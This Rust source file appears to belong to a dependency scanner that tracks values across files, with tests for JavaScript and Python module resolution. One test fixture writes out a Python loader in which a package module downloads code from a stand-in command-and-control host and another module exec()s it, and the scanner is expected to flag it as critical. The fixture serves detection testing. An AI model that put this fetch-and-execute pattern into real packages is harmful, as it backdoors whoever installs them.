pub fn answer(results: Vec<(Group, Outcome)>) -> Value {
    let mut out = Vec::new();
    for (g, o) in results {
        let mut item = vec![("lang", Value::str(g.lang.name())), ("root", Value::Str(g.root))];
        match o {
            Outcome::Issues(issues) => {
                if issues.is_empty() {
                    continue;
                }
                item.push((
                    "issues",
                    Value::Arr(issues.into_iter().map(|(i, v)| Value::Arr(vec![Value::Int(i as i64), v])).collect()),
                ));
            }
            Outcome::Failed(why) => item.push(("failed", Value::str(why))),
        }
        out.push(Value::obj(item));
    }
    Value::Arr(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn s(x: &str) -> PyStr {
        u(x)
    }

    #[test]
    fn module_keys_and_specifiers_as_core_reads_them() {
        assert_eq!(js_norm(&s("lib/index.js")), s("lib"));
        assert_eq!(js_norm(&s("index.js")), s("index"));
        assert_eq!(js_norm(&s("a.json")), s("a"));
        assert_eq!(js_key(&s("lib/a.js"), &s("./b")), Some(s("lib/b")));
        assert_eq!(js_key(&s("lib/a.js"), &s("..")), Some(s("index")));
        assert_eq!(js_key(&s("a.js"), &s("./x/index.js")), Some(s("x")));
        assert_eq!(js_key(&s("a.js"), &s("lodash")), None);
        assert_eq!(js_package(&s("node_modules/@s/p/lib/x.js")), Some(s("node_modules/@s/p")));
        assert_eq!(js_package(&s("a/node_modules/p/node_modules/q/x.js")), Some(s("a/node_modules/p/node_modules/q")));
        let pkg = [s("pkg"), s("sub")];
        let parts: Vec<&[u32]> = pkg.iter().map(|x| x.as_slice()).collect();
        assert_eq!(py_resolve(&s(".net"), &parts), Some(s("pkg.sub.net")));
        assert_eq!(py_resolve(&s("..a.b"), &parts), Some(s("pkg.a.b")));
        assert_eq!(py_resolve(&s("...."), &parts), None);
        assert_eq!(py_resolve(&s("requests"), &parts), Some(s("requests")));
        assert_eq!(js_destr(&s(" a, b as c, d: e, 'f': g ")), vec![
            (s("a"), s("a")), (s("b"), s("c")), (s("d"), s("e")), (s("f"), s("g"))]);
    }

    #[test]
    fn a_value_received_in_one_file_and_run_in_another() {
        let p = crate::pack::current();
        let net = s("import requests\n\ndef pull():\n    return requests.get('https://c2.invalid/p').text\n");
        let run = s("from ._net import pull\nexec(pull())\n");
        let files = vec![
            File { path: s("venv/lib/site-packages/pkg/_net.py"), lang: s("py"), text: &net, who: s("Dependency code"), group: None },
            File { path: s("venv/lib/site-packages/pkg/__init__.py"), lang: s("py"), text: &run, who: s("Dependency code"), group: None },
        ];
        let opts = Options { one_package: false, sep: s("/"), redact: true, neumaier: false, threads: 1, steps: crate::budget::DEFAULT_STEPS };
        let got = cross_file(&p, &files, &HashSet::new(), &opts);
        assert_eq!(got.len(), 1);
        match &got[0].1 {
            Outcome::Issues(issues) => {
                assert_eq!(issues.len(), 1);
                assert_eq!(issues[0].0, 1);
                let a = issues[0].1.as_arr().unwrap();
                assert_eq!(a[3].as_string().unwrap(), "CRITICAL");
                assert!(a[4].as_string().unwrap().contains("(pkg._net)"), "{:?}", a[4].as_string());
            }
            Outcome::Failed(why) => panic!("failed: {}", why),
        }
    }
}
